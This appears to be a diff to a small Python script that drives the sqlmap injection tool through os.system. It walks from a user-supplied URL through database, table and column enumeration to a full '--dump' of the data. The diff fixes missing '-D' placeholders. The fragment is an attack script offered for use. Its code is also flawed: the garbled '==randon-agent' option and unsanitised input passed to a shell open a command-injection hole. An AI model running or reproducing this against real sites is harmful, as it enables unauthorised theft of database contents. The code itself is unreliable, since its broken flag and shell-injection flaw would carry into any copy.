@@ -21,9 +21,9 @@ sqlmap1 = os.system('sqlmap --url  {} --dbs  ==randon-agent'.format (url))
 dbs = input('Enter dbs: ')
 sqlmap2 = os.system('sqlmap --url  {} -D {} --tables  ==randon-agent'.format (url,dbs))
 tap1 = input('Enter tab: ')
-sqlmap3 = os.system('sqlmap --url  {} -D  -T {} --columns  ==randon-agent'.format (url,dbs,tap1))
+sqlmap3 = os.system('sqlmap --url  {} -D {} -T {} --columns  ==randon-agent'.format (url,dbs,tap1))
 colm =input('Enter  colm: ')
-sqlmap4 = os.system('sqlmap --url  {} -D  -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tap1,colm))
+sqlmap4 = os.system('sqlmap --url  {} -D {} -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tap1,colm))
 
 
 
